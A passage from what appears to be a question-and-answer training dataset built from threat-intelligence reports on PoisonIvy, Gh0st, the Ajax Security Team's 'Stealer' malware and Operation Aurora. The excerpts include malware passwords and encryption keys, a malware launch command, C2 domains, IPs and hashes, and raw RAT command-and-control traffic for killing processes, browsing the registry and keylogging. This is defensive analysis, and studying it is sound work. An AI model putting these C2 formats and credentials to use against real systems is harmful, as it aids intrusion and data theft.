analyst pivoted on file\t\n  svchost the\t\n  following\t\n  relevant files were\t\n  discovered.\nSome\t\n \u00a0quick malware\t\n \u00a0analysis on dbServer.exe\t\n \u00a0revealed that it was\t\n \u00a0a variant of Trojan.PoisonIvy and it consisted of file dbServer.exe, which de-\u00ad\u2010obfuscated\t\n \u00a0and\t\n \u00a0loaded\t\n \u00a0res.db, which\t\n \u00a0then\t\n \u00a0loaded\t\n \u00a0memshare.dat. File svchost is the keystroke logger file of Trojan.PoisonIvy. File timebios.dll and share.dat were also found to be components of PoisonIvy. The PoisonIvy password that was configured in these samples was: 15911117665\nECAT\t\n  identified 6\t\n  systems that contain file timebios.dll:\nFour of these\t\n  six systems also contained file\t\n  dbServer.exe:\nSmall Headline: 4.2.8 ECAT Analysis \u2013 Hunting with InstantIOCs.\nAnother ECAT filter that is a good\t\n  APT malware identifier is the\t\n  \"Unsigned_ServiceDLL\"\t\n  filter. This InstantIOC filter will point out DLL\t\n  files that\t\n  are loaded as a service, but\t\n  which are not\t\n  signed. When running this filter\t\n  against\t\n  the GlobalModule List, ECAT points two\t\n  other types of Trojans that RSA\t\n  refers to as Trojan.Lurker\t\n  and Trojan.Superhardcore.\nECAT\t\n  pointed out four DLL files (tpoaed.dll, powms.dll, lpest.dll, asesed.dll) that are all variants of Trojan.Lurker:\nAlso, ECAT pointed\t\n  out a file named AppMgmt32.dll,\t\n  which \t\n  is \t\n  also an unsigned DLL that was loaded as a\t\n  service \t\n  named IRMON. RSA\t\n  refers to\t\n  this Trojan\t\n  as Trojan.Superhardcore. Overall, the following systems contained Trojan.Superhardcore:\nRead the text above and answer this question: What methods were used to analyze and identify the Trojan.Gh0st variant on system XXME, and what were the key findings?",
    "output": "To analyze and identify the Trojan.Gh0st variant on system XXME, the analyst performed time analysis around the bmp#.tmp files. Despite the unusual size of MSODBC.dll (about 50MB), it was found to be a component of Trojan.Gh0st, with junk data appended to avoid suspicion. The file mscmos.sys was an obfuscated configuration file containing the domain name ru.pad62.com and the victim's company name. Further investigation revealed that an executable file was cached under the administrator.NY account, indicating GUI access by the adversary. Internet history showed the malicious file was downloaded from www.haircollalife.com. The file was a dropper for Trojan.Gh0st, which dropped three files: 6to4adv.dll, BusMgr.sys, and SvcPack.dat. Another suspicious file, x8.txt, was downloaded from http://198.27.112.7:666 and was a digitally signed Trojan.FF-RAT variant.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attack Vectors\nWe have observed the Ajax Security Team use a variety of vectors to lure targets into installing malicious software and/or revealing login credentials. These attack vectors include sending email, private messages via social media, fake login pages, and the propagation of anti-censorship software that has been infected with malware.\nregistered the domain \"aeroconf2014[.]org\" in order to impersonate the IEEE Aerospace conference\u2014the conference's actual domain is aeroconf.org\u2014and sent out an email with the following information:\nFrom: invite@aeroconf2014[.]org\nSubject: IEEE Aerospace Conference 2014\nMedium Headline: Spear phishing\nDuring our investigation, we discovered that these attackers sent targeted emails, as well as private messages through social media. For example, the attackers targeted companies in the DIB using a fake conference page as a lure to trick targets into installing malicious software. The attackers\nThe email encouraged users to visit a fake conference website owned by the attackers:\nUpon visiting the website, visitors were notified that they must install \"proxy\" software in order to access it, which is actually malware.\nFigure 1: The Fake IEEE Aerospace Conference Website\n7 Bloomberg. \"Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.\" February 2014.\nMedium Headline: Credential Phishing\nThe attackers have also used phishing attacks, in which they set up Web pages to emulate various services that require security credentials. The attackers tailored these login pages for specific targets in the DIB and spoofed a variety of services such as Outlook Web Access and VPN login pages.\nIf users attempt to login through these fake Web pages, the attackers collect their login credentials.\npolitical opposition.18 In response to these restrictions, Iranians have been increasingly using software that bypasses such filtering technology.\nTo counter anti-censorship efforts, Iran has attempted to block the use of certain software tools.19 In 2012, researchers found that an anti-censorship tool that is primarily used by Internet users in Iran was bundled with malware and redistributed.20\nMedium Headline: Anti-censorship Tools\nAll Internet Service Providers (ISPs) in Iran are required to implement filtering technology that censors access to content which the Iranian government deems unacceptable.17 This content includes categories such as pornography and\nOur investigation found that malware-laden versions of legitimate anti-censorship software, such as Psiphon and Ultrasurf, were distributed to users Iran and Persian speaking people around the world.\nFigure 2: The Fake Outlook Web Access page\n17   OpenNet Initiative. \"Iran\". June 2009.\n18   OpenNet Initiative. \"After the Green Movement: Internet Controls in Iran 2009 \u2013 2012\". February 2013.\n19   Torbati, Y. \"Iran blocks use of tool to get around Internet filter\". March 2013.\n20   Marquis-Boire, M. \"Iranian anti-censorship software 'Simurgh' circulated with malicious backdoor\". May 2012.\nMedium Headline: The \"Stealer\" Malware Host-based Indicators and Malware Functionality\nWe have observed the Ajax Security Team use a malware family that they identify simply as 'Stealer'. They deliver this malware as a malicious executable (dropper). The executable is a CAB extractor that drops the implant IntelRS.exe. This implant, in turn, drops various other components into C:\\ Documents and Settings\\{USER}\\Application Data\\IntelRapidStart\\. The following files are written to disk in this location:\nThe IntelRS.exe is written in .NET and is aptly named \"Stealer\", as it has various data collection modules. It drops and launches AppTransferWiz.dll via the following command:\n\"C:\\WINDOWS\\system32\\rundll32.exe\" \"C:\\ Documents and Settings\\{USER}\\Application\nData\\IntelRapidStart\\AppTransferWiz.dll\",#110\n110 is an ordinal that corresponds to \"StartBypass\" export in AppTransferWiz.dll.\nFigure 3: StartBypass Ordinal\nData exfiltration is conducted over FTP by AppTransferWiz.dll, which acts as an FTP client. This DLL is written in Delphi. There is code to exfiltrate data over HTTP POST as well, but it is unused. We also found incomplete code that would perform SFTP and SMTP exfiltration, which could be completed in a future version.\nState is maintained between the stealer component IntelRS.exe and the FTP component AppTransferWiz.DLL using a file from the FTP server \"sqlite3.dll\", as well as a global atom \"SQLiteFinish\". IntelRS.exe waits in an indefinite loop, until AppTransferWiz.DLL defines this state.\nOnce the state is set, IntelRS.exe proceeds to collect data from various areas in the system as described below:\n\u2022 Collects system information: hostname, username, timezone, IP addresses, open ports, installed applications, running processes, etc.\n\u2022 Performs key logging\n\u2022 Takes various screenshots\n\u2022 Harvests instant messaging (IM) account information: GTalk, Pidgin, Yahoo, Skype\n\u2022 Tracks credentials, bookmarks and history from major browsers: Chrome, Firefox, Opera\n\u2022 Collects email account information\n\u2022 Extracts installed proxy software configuration information\n\u2022 Harvests data from installed cookies\nIntelRS.exe loads a Delphi component called DelphiNative.DLL, which implements some additional data theft functionality for the following:\n\u2022 Internet Explorer (IE) accounts\n\u2022 Remote Desktop Protocol (RDP) accounts\n\u2022 Browser URLs\nFigure 4: AppTransferWizard. dll creates sqlite3.dll and global atom\nThe Stealer component uses common techniques to acquire credential data. For instance, it loads vaultcli.DLL and uses various APIs shown below to acquire RDP accounts from the Windows vault.\nHarvested data is encrypted and written to disk on the local host. The filenames for these encrypted files follow this naming scheme:\n{stolen data type}_{victim system name}_ YYYYMMDD_HHMM.Enc\nThe {stolen data type} parameter indicates where the data was harvested from (e.g., a Web browser, an instant messenger application, installed proxy software).\nAnalysis of the malware indicates that the data is encrypted via a Rijndael cipher implementation; more specifically it uses AES which is a specific set of configurations of Rijndael. It uses a key size of 256 bytes and block size of 128 bytes, which conforms to the FIPS-197 specification of AES-256.21 It utilizes the passphrase 'HavijeBaba' and a salt of 'salam!*%#' as an input to PBKDF2 (Password-Based Key Derivation Function 2) to derive the key and initialization vector for the encryption.22 This key derivation implementation in .NET is done using the Rfc2898DeriveBytes class.23 The passphrase and salt are Persian language words. \"Havij\" means \"carrot\", \"Baba\" means \"father\", and \"Salam\" is a common greeting that means \"Peace\".\nFigure 6: Acquiring RDP Accounts\n21   ShawnFa. \"The Differences Between Rijndael and AES\". October 2006.\n22   Wikipedia. \"PBKDF2\".\n23   Microsoft. \"Rfc2898DeriveBytes Class\".\nMedium Headline: Sample Timeline\nWe identified 17 droppers during this research, including:\n\u2022 9 samples compiled on 2013-02-17 07:00\n\u2022 4 samples compiled on 2009-07-13 23:42\n\u2022 3 sample compiled on 2013-10-14 06:48\n\u2022 1 sample compiled on 2013-10-13 09:56\nThe 2009 compile time appears to have been forged, while the 2013 compile times may be legitimate.\nIn some cases, we found an implant but not the parent dropper. In total, 22 of the 23 implants that we identified during our research had unique compile times ranging from 2013-10-29 until 2014-03-15. We identified two implants that were both compiled on 2014-3-15 at 23:16. These compile times appear to be legitimate and coincide with attempted intrusion activity attributed to these attackers.\nMedium Headline: Spoofed Installers\nMany of the malicious executables (droppers) that we collected were bundled with legitimate installers for VPN or proxy software. Examples include:\n\u2022 6dc7cc33a3cdcfee6c4edb6c085b869d was bundled with an installer for Ultrasurf Proxy software.\n\u2022 3d26442f06b34df3d5921f89bf680ee9 was bundled with an installer for Gerdoovpn virtual private network software.\n\u2022 3efd971db6fbae08e96535478888cff9 was bundled with an installer for the Psiphon proxy.\n\u2022 288c91d6c0197e99b92c06496921bf2f was bundled with an installer for Proxifier software.\nThese droppers were also designed to visually spoof the appearance of the above applications. These droppers contained icons used in the legitimate installers for these programs.\nFigure 7: Icon for the Psiphon Anti-censorship Tool\nMedium Headline: Process Debug (PDB) Strings\nAnalysis of the PDB strings seen in the implants indicates that there may be more than one developer working on the source code for the Stealer builder. The following two PDB paths were seen in the collection of implants that we collected:\n\u2022 d:\\svn\\Stealer\\source\\Stealer\\Stealer\\obj\\ x86\\Release\\Stealer.pdb\n\u2022 f:\\Projects\\C#\\Stealer\\source\\Stealer\\ Stealer\\obj\\x86\\Release\\Stealer.pdb\nThese strings indicate that the Stealer source code was stored in two different paths but not necessarily on two different computers. The f:\\ Projects\\ path may be from an external storage device such as a thumb drive. It is therefore possible that only one person has access to the source code, but keeps a separate repository on an external storage device. Alternatively, the different file paths could be the result of two different actors storing their source code in two different locations.\nRead the text above and answer this question: Analyze the PDB strings found in the 'Stealer' malware implants. What insights can be drawn about the development environment and potential number of developers involved?",
    "output": "The PDB strings found in the 'Stealer' malware implants indicate two different file paths: 'd:\\svn\\Stealer\\source\\Stealer\\Stealer\\obj\\x86\\Release\\Stealer.pdb' and 'f:\\Projects\\C#\\Stealer\\source\\Stealer\\Stealer\\obj\\x86\\Release\\Stealer.pdb'. This suggests that the source code was stored in two different locations, possibly indicating multiple developers or a single developer using different storage devices. The different paths could also imply separate repositories or external storage usage, such as a thumb drive.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why does the presence of a Remote Access Tool (RAT) like Poison Ivy (PIVY) often indicate a targeted attack known as an Advanced Persistent Threat (APT)?",
    "output": "The presence of a RAT like Poison Ivy often indicates an APT because, unlike malware focused on opportunistic cybercrime, RATs require a live person on the other side of the attack. This characteristic suggests that the attacker is specifically interested in the targeted organization and is actively involved in the attack, making it more personal and potentially more dangerous.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: CnC Domains over Time\nDamballa's analysis of DNS data has revealed the very early origin (July 2009) of the botnet. Even during this early deployment, the botnet was widely dispersed. Since these were the first DNS resolutions for these attacks, it is reasonable to assume they are associated with the botmaster (e.g., testing or configuring their attack), and not victims. Thus, these resolutions might correspond to several CnC sites. If this theory is correct, it suggests that, despite using \"naive\" DDNS services typical of novice botnet operators, the Aurora botmasters had considerable resources available to them.\nSmall Headline: CnC_Domain.1\nThe first resolution for CnC_Domain.1 came from within Google China's offices. It was followed hours later by resolutions inside Google's offices in Mountain View, California. The pattern of lookups is remarkable, and is worth closer study. The first queries for CnC_Domain.1 were:\nCounting Attempted Exfiltration Events\nOther patterns of DNS messages in CnC_Domain.1 suggest the attempted exfiltration of data. Consider this ordering of queries:\n2009-12-18 06:29:09  MX  (Google Mountain View) 2009-12-18 06:29:09  A   (Google Mountain View)\nThe queries both happen in under a second, indicating that a host using a recursive resolver wished to send email to the CnC_Domain.1 CnC (hence the MX lookup). Dynamic DNS zones, however, almost never have valid MX RRsets, or if they do they are pointed to abuse@traps or spamtraps. Only a few DDNS providers offer mail, and the first query was therefore answered with an empty record (NOERROR status, with zero answers). As a result, the victim immediately performed an A query, to use the IP address for email. Whether these queries were followed by actual or successful email events is not known.\nAll MX queries in CnC_Domain.1 came from the United States (and no other network outside the US performed such a query before the news broke). Before January 10th 2010, some 110,810 MX queries came from Google Mountain View, and one came from Comcast (San Jose). This Comcast-based query may have been testing by a Google security engineer, or it may have been an infection on a notebook after work (since the query took place in the late evening hours, PST).\nFrom the volume of messages, it is presumed that each MX query corresponds to a single email exfiltration attempt. It would be hard to imagine a botmaster being able to direct these events individually. Thus, it may not be the case that bots were instructed to email materials when a specific event took place. Or the consistent pattern of queries could be the result of persistent searches of a hard drive, and attempted, periodic exfiltration of any useful data. This conclusion is speculation.\nThe lack of any diurnal pattern to these events does indicate that the trigger event for an MX lookup was not human-driven (e.g., the arrival of email on a victim machine, or selected actions by the botmaster). It is not known what information was taken, if any, or if these queries were in fact victim behavior. Public accounts from Google indicate that the attackers sought email records of human rights activists.\nIt is speculated that Google would have prevented the \"direct-to-MX\" behavior of hosts within their network. That is, in many corporate networks, individual user machines are prohibited from sending email directly, and must instead use a smart host or authenticated relay system. Thus, these MX lookups may well be side effect of an unsuccessful exfiltration effort. The malware also used ports 443 and 8585 for CnC, and could be instructed to perform any command.\nSmall Headline: CnC_Domain.3\nThe CnC_Domain.3 CnC domain is interesting because of its age. The botnet dates back to July 14, 2009, fell dormant for months, and then became active again within Google's network. Of the five CnC domains studied in detail within this report, this is the oldest, and most strongly suggests an origin for the botnet.\nThe early queries for the Aurora CnC domain CnC_Domain.3 took place in the HangZhou region, with some occurring in Beijing. The domain had a remarkable number of queries from mainland China\nand collocation facilities in the US within minutes of being created. Seconds later, another query came from Chinanet's network in the Chongqing area. The close timing of these suggests the owners of CnC_Domain.3 had access to ISP, university, and commercial transit.\nThe pattern of these lookups suggests that the author was performing testing, and had access to two different transits (e.g., a school network and an ISP).\nMedium Headline: Observed Loss of Queries\nWhen a botnet is remediated at the DNS level, the associated victims continue to query the authority DNS server. Unless and until the local network cleans the hosts or imposes network blocks, victim traffic to the authority will continue. A sudden loss of network traffic from a country, however, can be unusual, particularly where the victims are spread over disparate (heterogeneous policy) networks.\nThat is, it is unlikely that many different networks would simultaneously remediate hosts. Thus, while it may seem likely that all victims in a single network disappear (e.g., as when a network operator deploys a firewall rule), it is remarkable when all victims in diverse policy boundaries also disappear. Such centralized control speaks to the management of the botnet, and gives clues as to the policy preferences of the botmaster to attack/not attack a given suite of networks or countries.\nHosts performing DNS queries exhibited a random pattern of A queries. The TTL periods for the CnC domains was always short, meaning there was only a short period of time during which a stub query could be answered from cache, and not recorded at the authority. This behavior is typical of fast flux\nnetworks. An increase in TTL from 60 to 360 seconds was identified, which signifies the cut over from the default zone TTL to the SOA.minimum used for wildcarded domains. Thus, the DDNS domains used in the attack appear to have been deregistered before December 18 and remained \"open\" for anyone in the world to register until the first week of January 2010.\nBig Headline: The Malware Evolution\nAurora malware families date as far back as August of 2009. This trail helps determine the evolution and common characteristics of malware used by Operation Aurora, as well as a common modus operandi on the bot agents deployed as part of the attacks. The result is more than just an analysis of individual malware families. Rather, it helps profile the criminal operators behind Aurora via:\nMalware Delivery Method \u2013 How does the malware get into the system? Is there a common delivery method or is it random?\nSystem Behavior \u2013 Are the symptoms evident in the system common to all Aurora malware families or do they differ? Do the families use the same infection techniques, protection mechanisms and/or AV evasion techniques?\nNetwork Behavior \u2013Do the malware families exhibit the same network behavior?\nMedium Headline: CnC Server Trials Powered by Zero-Day Malware Variants\nThe table below lists significant events in the deployment and use of one of the Aurora botnet CnC servers known to the public, filoups.info, based on our data mining and analysis of malware samples and network traffic collected by Damballa. Several initial trials were conducted by the botnet operator prior to the \"production\" use of this CnC server.\nThe first set of CnC domains appeared in a FakeAV Trojan malware family1-a in the beginning of May 2009.  There were several variants of the family1 malware in the wild in 2009. The second set of CnC domains was used by a new family1-b malware variant in October 2009. By leveraging new Zero-Day malware variants, the botnet operator(s) could easily evade AV product detection and experiment with different CnC domain construction and communication. For example, different combinations of CnC domains were tried by both family1-c and family1-d malware variants in late October 2009. Finally, the CnC domain filoups.info was deployed and used by malware family1-e in November 2009.\nThe family1-e malware is part of Fake AV Alert/Scareware family analyzed below. The behavior of Fake Alert/Scareware is quite similar to Trojan.Hydraq malware associated with the actual Aurora attacks, albeit in a much more primitive form.\nMedium Headline: Sample Analysis Details\nThe additional samples in Damballa's possession that have been clustered as part of Aurora botnet malware can be separated into two distinct families of Fake AV Alert / Scareware: Login Software 2009 and Microsoft Antispyware Services. The first samples of each family were discovered by Damballa on November 26 2009 and August 19, 2009 respectively. The analysis details are broken down into the following:\nFirst Discovered \u2013 The time when the sample was first discovered and acquired by Damballa.\nPrevalence \u2013 The date range when the samples are still being seen in the wild by Damballa.\nInfection Vector \u2013 How the samples are delivered to the unsuspecting victims.\nSymptoms \u2013 Observable behaviors in the system that signals the possible presence of  malware without actually looking at the registry or searching for the malware file itself.\nSystem Behavior \u2013 How the malware works its way through the system to execute its objective.\nNetwork Behavior \u2013 A detailed look at how the malware utilizes the domains it connects to.\nProtection Mechanism \u2013 How the malware hides from the user or system inspection tools.\nAV Evasion Techniques \u2013 How the malware protects itself from being detected by AV host solutions.\nIntent \u2013 The main purpose of the malware family\nQ: What was the significance of the MX queries for CnC_Domain.1, and what does the lack of a diurnal pattern in these queries suggest about the nature of the exfiltration attempts?",
    "output": "The MX queries for CnC_Domain.1 suggested attempted exfiltration of data via email. The lack of a diurnal pattern in these queries indicates that the trigger event for an MX lookup was not human-driven, such as the arrival of email on a victim machine or specific actions by the botmaster. Instead, it suggests automated, persistent searches of a hard drive and periodic exfiltration attempts of any useful data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Basically, the response from the directory listing (date, time, file size, and file name) is sent back to the attacker in Base64 encoded format.\n- Process Manager window\nMain network traffic indicator of C2 activity through its \"Process Manager\" window:\no Process listing: \"proc|'|'|\"\no Killing a process: \"k|'|'|[Process_ID]\"\nproc|'|'|217.66.231.100:1185|'|'|pid|'|'|2396[endof]~[endof]proc|'|'|217.66.231.100:1185|'|'|~|'|'|33[endof]proc|'|'|217.66.2 31.100:1185|'|'|!|'|'|C:\\WINDOWS\\system32\\svchost.exe,976|'|'|C:\\WINDOWS\\Explorer.EXE,1804|'|'|C:\\Program\nFiles\\VMware\\VMware Tools\\vmacthlp.exe,960|'|'|C:\\Program Files\\Common Files\\Microsoft\nShared\\VS7DEBUG\\MDM.EXE,336|'|'|C:\\WINDOWS\\System32\\svchost.exe,1144|'|'|C:\\Program Files\\VMware\\VMware Tools\\TPAutoConnSvc.exe,1492|'|'|C:\\WINDOWS\\system32\\notepad.exe,1396|'|'|C:\\WINDOWS\\system32\\lsass.exe,7 76|'|'|C:\\Program Files\\VMware\\VMware\nTools\\TPAutoConnect.exe,2560|'|'|C:\\DOCUME~1\\Examiner\\LOCALS~1\\Temp\\ahbornad.exe,2396|'|'|C:\\WINDOWS\\sy stem32\\notepad.exe,416|'|'|C:\\WINDOWS\\system32\\services.exe,764|'|'|C:\\Program Files\\VMware\\VMware\nTools\\vmtoolsd.exe,656|'|'|C:\\WINDOWS\\system32\\svchost.exe,160|'|'|C:\\WINDOWS\\Microsoft.NET\\Framework\\v4.0.3 0319\\WPF\\WPFFontCache_v0400.exe,2896|'|'|C:\\WINDOWS\\system32\\svchost.exe,1024|'|'|C:\\WINDOWS\\system32\\c md.exe,540|'|'|C:\\WINDOWS\\system32\\smss.exe,572|'|'|C:\\WINDOWS\\system32\\wscntfy.exe,2264|'|'|C:\\WINDOWS\\sy stem32\\ctfmon.exe,1992|'|'|C:\\Program Files\\Symantec\\Norton Ghost\n2003\\GhostStartTrayApp.exe,1904|'|'|C:\\WINDOWS\\system32\\spoolsv.exe,1544|'|'|C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe,1896|'|'|C:\\Program Files\\Symantec\\Norton Ghost\n2003\\GhostStartService.exe,300|'|'|C:\\WINDOWS\\system32\\svchost.exe,1316|'|'|C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe,1888|'|'|\\??\\C:\\WINDOWS\\system32\\csrss.exe,640|'|'|C:\\WINDOWS\\system32\\rundll32.exe,188 0|'|'|\\??\\C:\\WINDOWS\\system32\\winlogon.exe,720|'|'|System,4|'|'|Idle,0|'|'|C:\\WINDOWS\\system32\\svchost.exe,1252|'|'| C:\\WINDOWS\\System32\\alg.exe,1872[endof]P[endof]P[endof]k|'|'|1396[endof]proc|'|'|217.66.231.100:1185|'|'|RM|'|'|13 96[endof]\nIn the above case, the Process Listing window opened in the Attacker's VM was used to kill a process in the Victim VM. Process information:\no Process path: C:\\WINDOWS\\system32\\notepad.exe\no Process ID: 1396\n- Registry window\nIn this case, the Registry window opened in the Attacker's VM was used to browse to the 'HKLM\\Software\\Microsost\\Windows\\CurrentVersion\\Run' location in the victim system.+1800.652.4020@FidSecSys\nMain network traffic indicator of C2 activity through its \"Registry\" window: \"RG|'|'|~|'|'|\"\nP[endof]P[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\|'|'|HARDWARE|'|'| SAM|'|'|SECURITY|'|'|SOFTWARE|'|'|SYSTEM|'|'|[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\[endof]RG|' |'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\|'|'|7-Zip|'|'|ActiveState|'|'|Adobe|'|'|AT&T Research\nLabs|'|'|C07ft5Y|'|'|Classes|'|'|Clients|'|'|Cygwin|'|'|Gemplus|'|'|Immunity\nInc|'|'|JetBrains|'|'|L&H|'|'|Macromedia|'|'|Microsoft|'|'|MozillaPlugins|'|'|Notepad++|'|'|NSIS_stunnel|'|'|ODBC|'|'|oreas|'|'|P erl|'|'|Policies|'|'|Program Groups|'|'|Python|'|'|Red\nGate|'|'|RegisteredApplications|'|'|RubyInstaller|'|'|Schlumberger|'|'|Secure|'|'|Symantec|'|'|ThinPrint|'|'|VMware, Inc.|'|'|Windows 3.1 Migration Status|'|'|WinPcap|'|'|{167F5D73-87FF-4f15-8EBD-\nC502337D7B34}|'|'|[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\[endof]RG|'|'|~|'|'|HKEY_LOCA L_MACHINE\\SOFTWARE\\Microsoft\\|'|'|.NETFramework|'|'|Active Setup|'|'|AD7Metrics|'|'|ADs|'|'|Advanced INF Setup|'|'|ALG|'|'|ASP.NET|'|'|AudioCompressionManager|'|'|BidInterface|'|'|COM3|'|'|Command\nProcessor|'|'|Conferencing|'|'|Cryptography|'|'|CTF|'|'|DataAccess|'|'|DataFactory|'|'|DevDiv|'|'|DeviceManager|'|'|Dfrg|'|'| Direct3D|'|'|DirectDraw|'|'|DirectInput|'|'|DirectMusic|'|'|DirectPlay|'|'|DirectPlay8|'|'|DirectPlayNATHelp|'|'|DirectX|'|'|Driver\nSigning|'|'|DRM|'|'|DrWatson|'|'|EAPOL|'|'|EnterpriseCertificates|'|'|ESENT|'|'|EventSystem|'|'|Exchange|'|'|Fusion|'|'|HTM LHelp|'|'|IE Setup|'|'|IE4|'|'|Ieak|'|'|IMAPI|'|'|IMEJP|'|'|IMEKR|'|'|IMEMIP|'|'|Intelligent Search|'|'|Internet Account\nManager|'|'|Internet Connection Wizard|'|'|Internet Domains|'|'|Internet Explorer|'|'|IPSec|'|'|Jet|'|'|Machine Debug Manager|'|'|MediaPlayer|'|'|MessengerService|'|'|Microsoft Reference|'|'|MM20|'|'|MMC|'|'|MMCtlsForIE|'|'|Mobile|'|'|Mr. Enigma|'|'|MSBuild|'|'|MSDAIPP|'|'|MSDTC|'|'|MSLicensing|'|'|MSMQ|'|'|MSNInstaller|'|'|MSOSOAP|'|'|MSXML 6.0\nParser and SDK|'|'|MSXML60|'|'|Multimedia|'|'|NET Framework AU|'|'|NET Framework\nSetup|'|'|NetDDE|'|'|NetSh|'|'|NetShow|'|'|Non-Driver Signing|'|'|ODBC|'|'|Office|'|'|Ole|'|'|Outlook\nExpress|'|'|PCHealth|'|'|Ras|'|'|RAS AutoDial|'|'|Remote\nDesktop|'|'|Router|'|'|Rpc|'|'|Schedule+|'|'|SchedulingAgent|'|'|Secure|'|'|Security Center|'|'|Shared|'|'|Shared Tools|'|'|Shared Tools\nLocation|'|'|SmartCard|'|'|Speech|'|'|SQMClient|'|'|SystemCertificates|'|'|Tcpip|'|'|TelnetServer|'|'|Terminal Server Client|'|'|TIP Shared|'|'|Tracing|'|'|Transaction Server|'|'|TShoot|'|'|Tuning Spaces|'|'|Updates|'|'|UPnP Device\nHost|'|'|VBA|'|'|VisualStudio|'|'|WAB|'|'|WBEM|'|'|Web Folders|'|'|Web Service Providers|'|'|Windows|'|'|Windows Imaging\nComponent|'|'|Windows Media Device Manager|'|'|Windows Messaging Subsystem|'|'|Windows NT|'|'|Windows Script Host|'|'|Windows Scripting\nHost|'|'|Wisp|'|'|Works|'|'|WSE|'|'|WZCSVC|'|'|[endof]P[endof]P[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\n\\Microsoft\\Windows\\[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\|'|'|CurrentVersion|'|'| Help|'|'|HTML Help|'|'|ITStorage|'|'|Shell|'|'|Windows Error\nReporting|'|'|[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\[endof]RG|'|' |~|'|'|HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\|'|'|App Management|'|'|App\nPaths|'|'|Applets|'|'|Control Panel|'|'|Controls Folder|'|'|CSCSettings|'|'|DateTime|'|'|Dynamic\nDirectory|'|'|Explorer|'|'|Extensions|'|'|Group Policy|'|'|H323TSP|'|'|Hints|'|'|IME|'|'|Installer|'|'|Internet\nSettings|'|'|IntlRun|'|'|IPConfTSP|'|'|MS-DOS\nEmulation|'|'|Nls|'|'|OptimalLayout|'|'|PhotoPropertyHandler|'|'|policies|'|'|PreviewHandlers|'|'|PropertySystem|'|'|Reinstall |'|'|Reliability|'|'|Run|'|'|RunOnce|'|'|RunOnceEx|'|'|Setup|'|'|SharedDlls|'|'|Shell\nExtensions|'|'|ShellCompatibility|'|'|ShellScrap|'|'|ShellServiceObjectDelayLoad|'|'|SideBySide|'|'|SMDEn|'|'|StillImage|'|'| Syncmgr|'|'|Telephony|'|'|ThemeManager|'|'|Themes|'|'|Uninstall|'|'|URL|'|'|WebCheck|'|'|WindowsUpdate|'|'|DevicePath/\nExpandString/C:\\WINDOWS\\inf|'|'|MediaPathUnexpanded/ExpandString/C:\\WINDOWS\\Media|'|'|SM_GamesName/Stri ng/Games|'|'|SM_ConfigureProgramsName/String/Set Program Access and\nDefaults|'|'|ProgramFilesDir/String/C:\\Program Files|'|'|CommonFilesDir/String/C:\\Program Files\\Common\nFiles|'|'|ProductId/String/76487-018-7438105-\n22214|'|'|WallPaperDir/ExpandString/C:\\WINDOWS\\Web\\Wallpaper|'|'|MediaPath/String/C:\\WINDOWS\\Media|'|'|Progra mFilesPath/ExpandString/C:\\Program\nFiles|'|'|SM_AccessoriesName/String/Accessories|'|'|PF_AccessoriesName/String/Accessories|'|'|[endof]RG|'|'|~|'|'|HKE Y_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\[endof]RG|'|'|~|'|'|HKEY_LOCAL_MACHIN\nwww.fidelissecurity.comwww.threatgeek.com+1800.652.4020@FidSecSys\nE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\|'|'|OptionalComponents|'|'|BluetoothAuthenticationAgent/Strin g/rundll32.exe bthprops.cpl,,BluetoothAuthenticationAgent|'|'|VMware Tools/String/\"C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe\"|'|'|VMware User Process/String/\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr|'|'|GhostStartTrayApp/String/C:\\Program Files\\Symantec\\Norton Ghost 2003\\GhostStartTrayApp.exe|'|'|IMJPMIG8.1/String/\"C:\\WINDOWS\\IME\\imjp8_1\\IMJPMIG.EXE\" /Spoil /RemAdvDef /Migration32|'|'|IMEKRMIG6.1/String/C:\\WINDOWS\\ime\\imkr6_1\\IMEKRMIG.EXE|'|'|MSPY2002/String/C:\\WINDOWS\\s ystem32\\IME\\PINTLGNT\\ImScInst.exe /SYNC|'|'|PHIME2002A/String/C:\\WINDOWS\\system32\\IME\\TINTLGNT\\TINTSETP.EXE /IMEName|'|'|Adobe Reader 9.0\\Reader\\Reader_sl.exe\"|'|'|0954e473c171a53f80142346107acfb3/String/\"C:\\Documents and\n/SYNC|'|'|PHIME2002ASync/String/C:\\WINDOWS\\system32\\IME\\TINTLGNT\\TINTSETP.EXE\nSpeed Launcher/String/\"C:\\Program Files\\Adobe\\Reader\nSettings\\Examiner\\Local Settings\\Temp\\ahbornad.exe\" ..|'|'|[endof]P[endof]P[endof]P[endof]P[endof]\n- Keylogger window\nMain network traffic indicator of C2 activity through its \"Keylogger\" window: \"kl|'|'|\"\nkl[endof]kl|'|'|DQoBMTMvMDYvMDYgV0lOV09SRCBEb2N1bWVudDEgLSBNaWNyb3NvZnQgV29yZAENCkhlbGxvIFdv cmxkIQ0KATEzLzA2LzA2IFdJTldPUkQgRG9jdW1lbnQxIC0gTWljcm9zb2Z0IFdvcmQBDQp0ZXN0DQoBMTMvMDYvMD 